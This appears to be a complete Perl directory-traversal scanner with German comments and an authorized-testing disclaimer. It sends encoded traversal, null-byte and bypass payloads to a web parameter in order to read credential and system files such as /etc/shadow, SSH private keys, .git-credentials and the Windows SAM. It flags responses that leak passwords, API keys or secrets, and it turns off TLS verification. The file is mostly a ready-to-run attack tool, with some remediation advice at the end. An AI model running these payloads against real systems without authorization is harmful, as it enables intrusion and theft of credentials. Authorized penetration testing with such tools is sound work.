#!/usr/bin/perl
#┌────────────────────────────────────────────────────────────────────────┐
#│                                                                        │
#│         ███████╗████████╗ ██████╗ ███████╗██████╗ ████████╗██╗         │
#│         ██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██║         │
#│         ███████╗   ██║   ██║   ██║█████╗  ██████╔╝   ██║   ██║         │
#│         ╚════██║   ██║   ██║   ██║██╔══╝  ██╔══██╗   ██║   ██║         │
#│         ███████║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║         │
#│         ╚══════╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝         │
#│                                                                        │
#│                    "old school, still root"                            │
#│                    "stoerti - the jobless hacker"                      │
#│                                                                        │
#│    ┌──────────────────────────────────────────────────────────────┐    │
#│    │  40 years in the trenches.     │  6 months unemployed in DE. │    │
#│    │  They fired the one who knew.  │  This is my legacy.         │    │
#│    │                   -- no patches for reality --               │    │
#│    └──────────────────────────────────────────────────────────────┘    │
#│                                                                        │
#└────────────────────────────────────────────────────────────────────────┘
# MIT License
#
# Copyright (c) 2026 Klaus Baumdick
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# ============================================================================
# DISCLAIMER
# ============================================================================
#
# This script is intended solely for educational purposes and authorized
# penetration testing in controlled environments.
#
# Unauthorized use of this script against systems without explicit written
# permission is illegal and may result in criminal or civil liability.
#
# The author assumes no responsibility for any misuse, damages, or legal
# consequences arising from the use of this script.
#
# USE AT YOUR OWN RISK.
# ============================================================================
no warnings 'uninitialized';
use strict;

use LWP::UserAgent;
use Time::HiRes qw(time);
use Getopt::Long;
use Term::ANSIColor qw(:constants);
use JSON::PP;
use URI::Escape;
use File::Basename;

# ======================================================================
# DIRECTORY TRAVERSAL SCANNER (Path Traversal)
# ======================================================================
# Autor:  Klaus Baumdick (stoerti) aka "The jobless hacker"
# Zweck:  Sucht nach Path Traversal/ Directory Traversal Schwachstellen
# Version: 1.0
# Lizenz: CC BY-NC-ND 4.0
# ======================================================================
# Testet:
#   • Einfache Traversal (../../../etc/passwd)
#   • URL-kodierte Varianten (%2e%2e%2f)
#   • Doppelt kodierte Varianten (%252e%252e%252f)
#   • Windows-Pfade (..\..\windows\win.ini)
#   • Absolut-Pfade (/etc/passwd, C:\windows\win.ini)
#   • Null-Byte-Injection (%00)
#   • Alternative Encodings (..;/, ..//, ....//)
# ======================================================================

# Farben
my $GREEN = GREEN;
my $RED = RED;
my $YELLOW = YELLOW;
my $CYAN = CYAN;
my $RESET = RESET;

# ======================================================================
# KONFIGURATION
# ======================================================================
my %config = (
    target_url      => '',
    parameter       => '',           # Bestimmter Parameter testen
    parameters      => [],           # Mehrere Parameter
    file            => '',           # Datei zum Testen (Default: auto)
    timeout         => 10,
    verbose         => 0,
    quiet           => 0,
    output_json     => '',
    user_agent      => 'Mozilla/5.0 (Directory Traversal Scanner)',
    delay           => 0.2,
    follow_redirects => 1,
    cookie          => '',
    auth_user       => '',
    auth_pass       => '',
    method          => 'GET',        # GET oder POST
    post_data       => '',           # POST-Daten
    depth           => 5,            # Maximale Traversal-Tiefe
    windows         => 1,            # Windows-Pfade testen
    unix            => 1,            # Unix-Pfade testen
    encode          => 1,            # URL-Encodings testen
    double_encode   => 1,            # Doppelte Encodings testen
    nullbyte        => 1,            # Null-Byte Injection testen
    indicators      => 1,            # Nach Indikatoren suchen (root, bin, boot)
    output_format   => 'text',
    auto_detect     => 1,            # Automatisch Parameter erkennen
    recursive       => 0,            # Rekursiv testen (mehrere Parameter)
    successful_only => 0,            # Nur erfolgreiche Ergebnisse zeigen
);

# ======================================================================
# TRAVERSAL PAYLOADS
# ======================================================================
my @unix_files = (
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/hostname',
    '/etc/issue',
    '/etc/motd',
    '/etc/group',
    '/etc/resolv.conf',
    '/etc/apache2/apache2.conf',
    '/etc/httpd/conf/httpd.conf',
    '/etc/nginx/nginx.conf',
    '/etc/mysql/my.cnf',
    '/etc/php.ini',
    '/etc/ssh/sshd_config',
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/nginx/access.log',
    '/var/log/nginx/error.log',
    '/var/log/messages',
    '/var/log/syslog',
    '/var/log/auth.log',
    '/proc/self/environ',
    '/proc/version',
    '/proc/cpuinfo',
    '/proc/meminfo',
    '/proc/self/cmdline',
    '~/.bash_history',
    '~/.ssh/id_rsa',
    '~/.ssh/authorized_keys',
    '~/.mysql_history',
    '~/.git-credentials',
);

my @windows_files = (
    'windows/win.ini',
    'windows/system32/drivers/etc/hosts',
    'windows/system32/config/sam',
    'windows/system32/config/system',
    'windows/system32/config/software',
    'windows/repair/sam',
    'windows/repair/system',
    'windows/repair/software',
    'windows/debug/NetSetup.log',
    'windows/iis.log',
    'windows/system32/inetsrv/config/schema/ASPNET_schema.xml',
    'Program Files/Apache Software Foundation/Apache2.2/conf/httpd.conf',
    'Program Files/MySQL/MySQL Server 5.5/my.ini',
    'Program Files/FileZilla Server/FileZilla Server.xml',
    'xampp/apache/conf/httpd.conf',
    'xampp/mysql/bin/my.ini',
    'xampp/php/php.ini',
    'Users/Administrator/NTUSER.DAT',
    'Users/Administrator/Desktop/',
    'Documents and Settings/Administrator/Desktop/',
    'boot.ini',
    'autoexec.bat',
    'config.sys',
);


# ======================================================================
# TRAVERSAL PATTERNS (KORRIGIERT)
# ======================================================================
my @traversal_patterns = (
    # Einfache Traversal
    { name => "Simple (../)", pattern => "../" x 1 . "%s" },
    { name => "Simple (../../)", pattern => "../" x 2 . "%s" },
    { name => "Simple (../../../)", pattern => "../" x 3 . "%s" },
    { name => "Simple (../../../../)", pattern => "../" x 4 . "%s" },
    { name => "Simple (../../../../../)", pattern => "../" x 5 . "%s" },
    { name => "Simple (..\\..\\)", pattern => "..\\..\\" x 1 . "%s" },  # Windows
    { name => "Simple (..\\..\\..\\)", pattern => "..\\..\\..\\" . "%s" },

    # URL-kodiert
    { name => "URL encoded (..%2f)", pattern => "..%2f" x 1 . "%s" },
    { name => "URL encoded (..%2f..%2f)", pattern => "..%2f" x 2 . "%s" },
    { name => "URL encoded (..%2f..%2f..%2f)", pattern => "..%2f" x 3 . "%s" },
    { name => "URL encoded (..%5c)", pattern => "..%5c" x 1 . "%s" },    # Windows backslash
    { name => "URL encoded (..%5c..%5c)", pattern => "..%5c" x 2 . "%s" },

    # Doppelt URL-kodiert
    { name => "Double encoded (%252e%252e%252f)", pattern => "%252e%252e%252f" x 1 . "%s" },
    { name => "Double encoded (%252e%252e%252f%252e%252e%252f)", pattern => "%252e%252e%252f" x 2 . "%s" },
    { name => "Double encoded (%255c)", pattern => "%255c" x 1 . "%s" },  # Windows
    { name => "Double encoded (%255c%255c)", pattern => "%255c" x 2 . "%s" },

    # Alternative Encodings
    { name => "Unicode encoded (..%c0%af)", pattern => "..%c0%af" x 1 . "%s" },
    { name => "Unicode encoded (..%c1%9c)", pattern => "..%c1%9c" x 1 . "%s" },  # Windows
    { name => "Unicode encoded (%c0%ae%c0%ae%c0%af)", pattern => "%c0%ae%c0%ae%c0%af" x 1 . "%s" },

    # Absolute Pfade
    { name => "Absolute path (Unix)", pattern => "%s" },
    { name => "Absolute path (Windows C:\\)", pattern => "C:\\%s" },
    { name => "Absolute path (Windows D:\\)", pattern => "D:\\%s" },
    { name => "Absolute path (Windows \\\\)", pattern => "\\\\%s" },

    # Bypass-Techniken
    { name => "Null byte injection", pattern => "../../../%s%00" },
    { name => "Double slash", pattern => "....//....//....//%s" },  # ....// statt ../
    { name => "URL encoded null byte", pattern => "../../../%s%2500" },
    { name => "Semi-colon bypass", pattern => "../../../%s;" },
    { name => "Question mark bypass", pattern => "../../../%s?" },
    { name => "Hash bypass", pattern => "../../../%s#" },

    # Windows spezifische Bypässe
    { name => "Windows drive letter", pattern => "C:../%s" },
    { name => "Windows UNC path", pattern => "\\\\localhost\\c$\\%s" },
    { name => "Windows alternativ", pattern => "....\\....\\....\\%s" },
);

# ======================================================================
# KOMMANDOZEILENOPTIONEN
# ======================================================================
GetOptions(
    'url=s'           => \$config{target_url},
    'param=s'         => \$config{parameter},
    'paramlist=s'     => \@{$config{parameters}},
    'file=s'          => \$config{file},
    'timeout=i'       => \$config{timeout},
    'verbose'         => \$config{verbose},
    'quiet'           => \$config{quiet},
    'output=s'        => \$config{output_json},
    'user-agent=s'    => \$config{user_agent},
    'delay=f'         => \$config{delay},
    'follow-redirects'=> \$config{follow_redirects},
    'cookie=s'        => \$config{cookie},
    'auth=s'          => \$config{auth_user},
    'auth-pass=s'     => \$config{auth_pass},
    'method=s'        => \$config{method},
    'data=s'          => \$config{post_data},
    'depth=i'         => \$config{depth},
    'no-windows'      => sub { $config{windows} = 0 },
    'no-unix'         => sub { $config{unix} = 0 },
    'no-encode'       => sub { $config{encode} = 0 },
    'no-double-encode'=> sub { $config{double_encode} = 0 },
    'no-nullbyte'     => sub { $config{nullbyte} = 0 },
    'no-indicators'   => sub { $config{indicators} = 0 },
    'auto-detect'     => \$config{auto_detect},
    'recursive'       => \$config{recursive},
    'success-only'    => \$config{successful_only},
    'format=s'        => \$config{output_format},
    'help'            => sub { print_help(); exit 0; }
) or die "Fehler in Optionen. Verwende --help\n";

# ======================================================================
# VALIDIERUNG
# ======================================================================
validate_config();

# ======================================================================
# INITIALISIERUNG
# ======================================================================
my $start_time = time();
my @results = ();
my $total_requests = 0;
my $found_vulnerabilities = 0;

show_banner();
print_info("Ziel: $config{target_url}");
print_info("Method: $config{method}");
print_info("Timeout: $config{timeout} Sekunden");

# User-Agent erstellen
my $ua = create_user_agent();

# ======================================================================
# 1. PARAMETER AUTOMATISCH ERKENNEN
# ======================================================================
if ($config{auto_detect}) {
    print_section("PARAMETER ERKENNUNG");
    detect_parameters();
}

# Parameter-Liste erstellen
my @params_to_test = ();
if ($config{parameter}) {
    push @params_to_test, $config{parameter};
}
push @params_to_test, @{$config{parameters}};

if (@params_to_test == 0) {
    print_warning("Keine Parameter zum Testen angegeben!");
    print "Verwendung: --param datei oder --paramlist file,id,page\n";
    exit 1;
}

print_info("Teste Parameter: " . join(', ', @params_to_test));

# ======================================================================
# 2. DATEIEN FÜR TEST AUSWÄHLEN
# ======================================================================
print_section("TRAVERSAL TESTS");

my @test_files = ();
if ($config{file}) {
    push @test_files, $config{file};
} else {
    push @test_files, @unix_files if $config{unix};
    push @test_files, @windows_files if $config{windows};
}

print_info("Teste " . scalar(@test_files) . " Dateien mit " . scalar(@traversal_patterns) . " Patterns");

# ======================================================================
# 3. TRAVERSAL TESTS DURCHFÜHREN
# ======================================================================
my $total_tests = scalar(@params_to_test) * scalar(@test_files) * scalar(@traversal_patterns);
my $current_test = 0;

foreach my $param (@params_to_test) {
    print_info("\nParameter: $param");

    foreach my $file (@test_files) {
        foreach my $pattern (@traversal_patterns) {
            $current_test++;

            # Nur relevante Patterns filtern
            next if ($file =~ /^C:/ && $pattern->{name} !~ /Windows/i && $pattern->{name} !~ /backslash/i);
            next if ($file =~ /^\// && $pattern->{name} =~ /Windows/i);

            # Fortschritt anzeigen
            if (!$config{quiet} && $current_test % 10 == 0) {
                print "\r  Fortschritt: $current_test/$total_tests (" .
                      int($current_test/$total_tests*100) . "%)";
            }

            my $payload = build_payload($pattern->{pattern}, $file);
            my $result = send_request($param, $payload);

            if ($result->{vulnerable}) {
                $found_vulnerabilities++;
                print "\n" if !$config{quiet};
                print_color("$RED  → VERWUNDBAR! $result->{match}$RESET");
                print_info("    Parameter: $param");
                print_info("    Payload: $payload");
                print_info("    Pattern: $pattern->{name}");
                print_info("    Datei: $file");
                print_info("    Status: $result->{status}");

                push @results, $result;

                # Bei Fund nicht alle Patterns testen wenn erfolgreich_only
                last if $config{successful_only};
            }

            sleep($config{delay}) if $config{delay} > 0;
        }
    }
}

print "\n" if !$config{quiet};

# ======================================================================
# 4. INDIKATOREN SUCHEN (root, bin, boot, etc.)
# ======================================================================
if ($config{indicators} && $found_vulnerabilities > 0) {
    print_section("INDIKATOREN ANALYSE");

    foreach my $result (@results) {
        if ($result->{content}) {
            check_indicators($result);
        }
    }
}

# ======================================================================
# 5. ERGEBNISSE ANZEIGEN
# ======================================================================
print_section("ERGEBNISSE");

show_results();

# ======================================================================
# 6. OUTPUT SPEICHERN
# ======================================================================
if ($config{output_json}) {
    save_output();
}

# ======================================================================
# 7. EMPFEHLUNGEN
# ======================================================================
print_recommendations();

# ======================================================================
# ABSCHLUSS
# ======================================================================
my $total_time = time() - $start_time;
print_info(sprintf("Gesamtzeit: %.2f Sekunden", $total_time));
print_info("Requests gesendet: $total_requests");
print_info("Gefundene Schwachstellen: $found_vulnerabilities");

exit($found_vulnerabilities > 0 ? 1 : 0);

# ======================================================================
# HILFSFUNKTIONEN
# ======================================================================

sub validate_config {
    if (!$config{target_url}) {
        print_error("Keine Ziel-URL angegeben");
        print "Verwendung: $0 --url https://example.com [--param datei]\n";
        exit 1;
    }

    $config{target_url} =~ s/\/$//;
    if ($config{target_url} !~ /^https?:\/\//) {
        $config{target_url} = 'https://' . $config{target_url};
        print_warning("URL zu https:// ergänzt");
    }

    if ($config{method} !~ /^(GET|POST)$/i) {
        print_error("Methode muss GET oder POST sein");
        exit 1;
    }
}

sub create_user_agent {
    my $ua = LWP::UserAgent->new(
        timeout => $config{timeout},
        agent => $config{user_agent},
        max_size => 1024 * 1024 * 10,
        keep_alive => 0,
        max_redirect => $config{follow_redirects} ? 5 : 0,
        cookie_jar => {},
    );

    $ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0);

    if ($config{auth_user} && $config{auth_pass}) {
        $ua->credentials($config{target_url}, '', $config{auth_user}, $config{auth_pass});
    }

    if ($config{cookie}) {
        $ua->default_header('Cookie' => $config{cookie});
    }

    $ua->default_header('Accept' => '*/*');
    $ua->default_header('Accept-Language' => 'de,en-US;q=0.7,en;q=0.3');

    return $ua;
}

sub detect_parameters {
    # Versuche Parameter aus der URL zu extrahieren
    if ($config{target_url} =~ /\?/) {
        my $query = $config{target_url};
        $query =~ s/^.*\?//;
        my @pairs = split(/&/, $query);
        foreach my $pair (@pairs) {
            my ($key, $val) = split(/=/, $pair);
            if ($key && !grep { $_ eq $key } @{$config{parameters}}) {
                push @{$config{parameters}}, $key;
                print_info("Parameter gefunden: $key");
            }
        }
    }

    # Häufige Parameter-Namen testen
    my @common_params = qw(
        file path dir document page include read f document_root
        folder root location data template style sheet load
        view content action option id cat category
    );

    foreach my $param (@common_params) {
        if (!grep { $_ eq $param } @{$config{parameters}}) {
            push @{$config{parameters}}, $param;
        }
    }
}

sub build_payload {
    my ($pattern, $file) = @_;

    # Tiefe anpassen basierend auf Pattern
    my $payload = $pattern;

    # Windows-Pfade anpassen
    if ($file =~ /^C:/ || $file =~ /^windows/) {
        $file =~ s/^C://;
    }

    $payload =~ s/%s/$file/g;

    return $payload;
}


sub send_request {
    my ($param, $payload) = @_;
    $total_requests++;

    my $url = $config{target_url};
    my $response;
    my $result = {
        param => $param,
        payload => $payload,
        vulnerable => 0,
        status => 0,
        content => '',
        content_type => '',
        match => '',
    };

    if ($config{method} eq 'GET') {
        if ($url =~ /\?/) {
            $url .= "&$param=" . uri_escape($payload);
        } else {
            $url .= "?$param=" . uri_escape($payload);
        }

        eval {
            local $SIG{ALRM} = sub { die "timeout\n"; };
            alarm($config{timeout});
            $response = $ua->get($url);
            alarm(0);
        };
    } else {
        my %post_data = ();
        if ($config{post_data}) {
            my @pairs = split(/&/, $config{post_data});
            foreach my $pair (@pairs) {
                my ($key, $val) = split(/=/, $pair);
                $post_data{$key} = $val;
            }
        }
        $post_data{$param} = $payload;

        eval {
            local $SIG{ALRM} = sub { die "timeout\n"; };
            alarm($config{timeout});
            $response = $ua->post($url, \%post_data);
            alarm(0);
        };
    }

    if ($@ && $@ =~ /timeout/) {
        $result->{status} = 'timeout';
        return $result;
    }

    $result->{status} = $response->code;
    $result->{content} = $response->content;
    $result->{content_type} = $response->header('Content-Type') || '';

    check_response($result);

    return $result;
}

sub send_request2 {
    my ($param, $payload) = @_;
    $total_requests++;

    my $url = $config{target_url};
    my $response;
    my $result = {
        param => $param,
        payload => $payload,
        vulnerable => 0,
        status => 0,
        content => '',
        match => '',
    };

    if ($config{method} eq 'GET') {
        # Parameter an URL anhängen
        if ($url =~ /\?/) {
            $url .= "&$param=" . uri_escape($payload);
        } else {
            $url .= "?$param=" . uri_escape($payload);
        }

        eval {
            local $SIG{ALRM} = sub { die "timeout\n"; };
            alarm($config{timeout});
            $response = $ua->get($url);
            alarm(0);
        };
    } else {
        # POST Request
        my %post_data = ();
        if ($config{post_data}) {
            # Bestehende POST-Daten parsen
            my @pairs = split(/&/, $config{post_data});
            foreach my $pair (@pairs) {
                my ($key, $val) = split(/=/, $pair);
                $post_data{$key} = $val;
            }
        }
        # Unseren Parameter hinzufügen/überschreiben
        $post_data{$param} = $payload;

        eval {
            local $SIG{ALRM} = sub { die "timeout\n"; };
            alarm($config{timeout});
            $response = $ua->post($url, \%post_data);
            alarm(0);
        };
    }

    if ($@ && $@ =~ /timeout/) {
        $result->{status} = 'timeout';
        return $result;
    }

    $result->{status} = $response->code;
    $result->{content} = $response->content;

    # Prüfen ob Datei ausgelesen wurde
    check_response($result);

    return $result;
}


sub check_response {
    my ($result) = @_;

    my $content = $result->{content};
    my $content_type = $result->{content_type} || '';

    # Wenn es offensichtlich HTML ist, nichts finden
    if ($content =~ /<\!DOCTYPE html/i ||
        $content =~ /<html/i ||
        $content =~ /<body/i ||
        $content_type =~ /text\/html/) {

        # Trotzdem prüfen ob Systemdatei-Inhalt drin ist
        if ($content =~ /root:x:0:0:/ ||
            $content =~ /\[fonts\]/i ||
            $content =~ /PID\s+TTY/i) {
            # Echter Treffer
        } else {
            return;  # False Positive
        }
    }

    # Echte Indikatoren für Systemdateien
    if ($content =~ /root:x:0:0:/) {
        $result->{vulnerable} = 1;
        $result->{match} = "✅ etc/passwd gefunden (root:)";
    }
    elsif ($content =~ /^root:.*:\/bin\/bash$/m) {
        $result->{vulnerable} = 1;
        $result->{match} = "✅ etc/passwd Struktur erkannt";
    }
    elsif ($content =~ /^127\.0\.0\.1\s+localhost/m) {
        $result->{vulnerable} = 1;
        $result->{match} = "✅ etc/hosts gefunden";
    }
    elsif ($content =~ /^PID\s+TTY\s+TIME\s+CMD$/m) {
        $result->{vulnerable} = 1;
        $result->{match} = "✅ proc/self/cmdline oder ps Ausgabe";
    }
    elsif ($content =~ /^\[fonts\]$/m) {
        $result->{vulnerable} = 1;
        $result->{match} = "✅ win.ini gefunden (Windows)";
    }
    elsif ($content =~ /^for 16-bit app support$/m) {
        $result->{vulnerable} = 1;
        $result->{match} = "✅ windows/system32/drivers/etc/hosts";
    }
    elsif ($content =~ /^\[boot loader\]$/m) {
        $result->{vulnerable} = 1;
        $result->{match} = "✅ boot.ini gefunden (Windows)";
    }
    # Spezifische Konfigurationsdateien
    elsif ($content =~ /<VirtualHost/i && $content =~ /ServerName/i && $content !~ /<html/i) {
        $result->{vulnerable} = 1;
        $result->{match} = "✅ Apache Konfiguration gefunden";
    }
    elsif ($content =~ /^user = mysql$/m || $content =~ /^datadir = /m) {
        $result->{vulnerable} = 1;
        $result->{match} = "✅ MySQL Konfiguration gefunden";
    }
    # Nach sensiblen Daten suchen (nur wenn es nicht HTML ist)
    elsif ($content !~ /<html/i && length($content) < 50000) {
        if ($content =~ /password|passwd|pwd|pass/i) {
            $result->{vulnerable} = 1;
            $result->{match} = "✅ Datei mit Passwort-Indikatoren";
        }
        elsif ($content =~ /api[_-]?key|apikey|secret|token/i) {
            $result->{vulnerable} = 1;
            $result->{match} = "✅ Datei mit API-Keys/Secrets";
        }
        elsif ($content =~ /DB_|database|mysql|pgsql|sqlite/i) {
            $result->{vulnerable} = 1;
            $result->{match} = "✅ Datei mit Datenbank-Indikatoren";
        }
        elsif ($content =~ /ssh-rsa|ssh-dss|BEGIN RSA/i) {
            $result->{vulnerable} = 1;
            $result->{match} = "✅ SSH-Key gefunden";
        }
    }
}




sub check_response2 {
    my ($result) = @_;

    my $content = $result->{content};

    # Unix/Linux Indikatoren
    if ($content =~ /root:x:0:0:/) {
        $result->{vulnerable} = 1;
        $result->{match} = "etc/passwd gefunden (root:)";
    }
    elsif ($content =~ /bin:.*:\/bin\//) {
        $result->{vulnerable} = 1;
        $result->{match} = "etc/passwd Struktur erkannt";
    }
    elsif ($content =~ /127\.0\.0\.1\s+localhost/) {
        $result->{vulnerable} = 1;
        $result->{match} = "etc/hosts gefunden";
    }
    elsif ($content =~ /PID\s+TTY\s+TIME\s+CMD/i) {
        $result->{vulnerable} = 1;
        $result->{match} = "proc/self/cmdline oder ps Ausgabe";
    }
    elsif ($content =~ /\[fonts\]|\[extensions\]|\[mci extensions\]/i) {
        $result->{vulnerable} = 1;
        $result->{match} = "win.ini gefunden (Windows)";
    }
    elsif ($content =~ /for 16-bit app support/i) {
        $result->{vulnerable} = 1;
        $result->{match} = "windows/system32/drivers/etc/hosts";
    }
    elsif ($content =~ /APR_|PHP|Apache|ServerName/i) {
        $result->{vulnerable} = 1;
        $result->{match} = "Apache/nginx Konfiguration gefunden";
    }
    elsif ($content =~ /mysql|innodb|datadir/i) {
        $result->{vulnerable} = 1;
        $result->{match} = "MySQL Konfiguration gefunden";
    }
    # Allgemeine Indikatoren
    elsif ($content =~ /<\!DOCTYPE html/i) {
        # HTML-Seite, nichts gefunden
    }
    elsif ($content =~ /root|bin|daemon|sys|sync/i && length($content) < 10000) {
        $result->{vulnerable} = 1;
        $result->{match} = "Unix-User gefunden (root, bin, etc.)";
    }
    elsif ($content =~ /\[boot loader\]|\[operating systems\]/i) {
        $result->{vulnerable} = 1;
        $result->{match} = "boot.ini gefunden (Windows)";
    }
}

sub check_indicators {
    my ($result) = @_;

    my $content = $result->{content};

    # Nach sensiblen Daten suchen
    if ($content =~ /password|passwd|pwd|pass/i) {
        print_warning("    Password-Indikator gefunden!");
    }
    if ($content =~ /api[_-]?key|apikey|secret|token/i) {
        print_warning("    API-Key/Secret gefunden!");
    }
    if ($content =~ /DB_|database|mysql|pgsql|sqlite/i) {
        print_warning("    Datenbank-Indikator gefunden!");
    }
    if ($content =~ /ssh-rsa|ssh-dss|BEGIN RSA/i) {
        print_warning("    SSH-Key gefunden!");
    }

    # Dateigröße
    my $size = length($content);
    print_info("    Dateigröße: " . int($size/1024) . " KB") if $config{verbose};
}

sub show_results {
    print "\n" . "=" x 60 . "\n";
    print "DIRECTORY TRAVERSAL SCAN ERGEBNISSE:\n";
    print "=" x 60 . "\n";

    if ($found_vulnerabilities == 0) {
        print "❌ Keine Directory Traversal Schwachstellen gefunden.\n";
    } else {
        print "GEFUNDENE SCHWACHSTELLEN ($found_vulnerabilities):\n";

        foreach my $result (@results) {
            print "\n$RED▶ $result->{match}$RESET\n";
            print "  Parameter: $result->{param}\n";
            print "  Payload: $result->{payload}\n";
            print "  Status: $result->{status}\n";

            if ($config{verbose}) {
                print "\n  [Auszug aus der Antwort]\n";
                my @lines = split /\n/, $result->{content};
                my $count = 0;
                foreach my $line (@lines) {
                    last if $count++ > 10;
                    next if $line =~ /^\s*$/;
                    $line =~ s/^\s+//;
                    $line =~ s/\s+$//;
                    print "  $line\n";
                }
                print "  ...\n" if @lines > 10;
            }
        }
    }
}

sub save_output {
    my $output = {
        tool => "Directory Traversal Scanner",
        version => "1.0",
        timestamp => scalar(localtime()),
        target => $config{target_url},
        config => \%config,
        statistics => {
            total_requests => $total_requests,
            vulnerabilities => $found_vulnerabilities,
            parameters_tested => scalar(@params_to_test),
            patterns_tested => scalar(@traversal_patterns),
            files_tested => scalar(@test_files),
            scan_time => time() - $start_time,
        },
        results => \@results,
    };

    if ($config{output_format} eq 'json' || $config{output_json} =~ /\.json$/) {
        my $json = JSON::PP->new->pretty->encode($output);
        open(my $fh, '>', $config{output_json}) or die "Kann Datei nicht öffnen: $!";
        print $fh $json;
        close($fh);
        print_success("JSON gespeichert: $config{output_json}");
    }
}

sub print_recommendations {
    print_section("EMPFEHLUNGEN");

    my @recs = (
        "• Benutzereingaben immer validieren und filtern",
        "• Keine direkten Dateipfade aus Benutzereingaben verwenden",
        "• Whitelist für erlaubte Dateien/Verzeichnisse",
        "• Dateipfade normalisieren (realpath() in PHP)",
        "• Chroot-Umgebung für Dateizugriffe nutzen",
        "• Web Application Firewall (WAF) einsetzen",
        "• Regelmäßige Sicherheits-Scans durchführen",
    );

    if ($found_vulnerabilities > 0) {
        unshift @recs, "🔴 SOFORT HANDELN! Directory Traversal Schwachstellen gefunden!";
        unshift @recs, "• Eingabefilter für ../ und %2e%2e%2f implementieren";
        unshift @recs, "• Zugriff auf Systemdateien komplett unterbinden";
    }

    foreach (@recs) {
        print "$_\n";
    }
}

sub print_help {
    print <<"HELP";
================================================================================
DIRECTORY TRAVERSAL SCANNER v1.0
================================================================================

BESCHREIBUNG:
  Sucht nach Path Traversal/ Directory Traversal Schwachstellen in Webapplikationen.
  Testet verschiedene Encodings, Bypass-Techniken und Systemdateien.

GETESTETE TECHNIKEN:
  • Einfache Traversal (../../../etc/passwd)
  • URL-kodiert (%2e%2e%2f)
  • Doppelt kodiert (%252e%252e%252f)
  • Unicode (%c0%af, %c1%9c)
  • Null-Byte Injection (%00)
  • Absolute Pfade (/etc/passwd, C:\\windows\\win.ini)

VERWENDUNG:
  $0 --url <url> --param <parameter> [Optionen]

OPTIONEN:
  --url URL        Ziel-URL (z.B. https://example.com/file.php)

  --param NAME     Einzelnen Parameter testen (z.B. --param file)
  --paramlist LIST Mehrere Parameter (komma-getrennt: file,path,dir)
  --auto-detect    Parameter automatisch erkennen

  --file DATEI     Bestimmte Datei testen (Default: auto)
  --depth N        Maximale Traversal-Tiefe (Default: 5)

  --method GET|POST HTTP-Methode (Default: GET)
  --data DATA      POST-Daten für POST-Requests

  --[no-]windows   Windows-Dateien testen (Default: an)
  --[no-]unix      Unix-Dateien testen (Default: an)
  --[no-]encode    URL-Encodings testen (Default: an)
  --[no-]double-encode Doppelte Encodings (Default: an)
  --[no-]nullbyte  Null-Byte Injection (Default: an)
  --[no-]indicators Nach Indikatoren suchen (Default: an)

  --success-only   Nur erfolgreiche Ergebnisse zeigen
  --recursive      Rekursiv testen (mehrere Parameter)

  --timeout N      Timeout in Sekunden (Default: 10)
  --delay N        Pause zwischen Requests (Default: 0.2)
  --verbose        Ausführliche Ausgabe
  --quiet          Minimale Ausgabe
  --output DATEI   Ergebnisse als JSON speichern

  --help           Diese Hilfe anzeigen

BEISPIELE:
  # Einfacher Test
  $0 --url https://example.com/file.php --param file

  # Mehrere Parameter testen
  $0 --url https://example.com/index.php --paramlist file,path,dir

  # Mit Auto-Detection
  $0 --url https://example.com/page?id=1 --auto-detect

  # Windows-spezifisch
  $0 --url https://example.com/download.php --param file --no-unix

  # POST-Request
  $0 --url https://example.com/upload.php --method POST --data "action=read"

HINWEISE:
  • Nur auf eigenen oder autorisierten Systemen testen!
  • Directory Traversal kann zu vollständiger Kompromittierung führen
  • CC BY-NC-ND 4.0 Lizenz - Nur für Bildungszwecke

================================================================================
HELP
    exit 0;
}

sub show_banner {
    print <<"BANNER";
$CYAN================================================================================
DIRECTORY TRAVERSAL SCANNER v1.0
================================================================================$RESET
BANNER
}

sub print_section {
    my ($title) = @_;
    print "\n$CYAN▶ $title$RESET\n";
    print "-" x 40 . "\n";
}

sub print_success {
    my ($msg) = @_;
    print "$GREEN✓ $msg$RESET\n" unless $config{quiet};
}

sub print_error {
    my ($msg) = @_;
    print "$RED❌ $msg$RESET\n";
}

sub print_warning {
    my ($msg) = @_;
    print "$YELLOW⚠️  $msg$RESET\n";
}

sub print_info {
    my ($msg) = @_;
    print "  $msg\n" if $config{verbose} && !$config{quiet};
}

sub print_color {
    my ($msg) = @_;
    print "$msg\n";
}

__END__
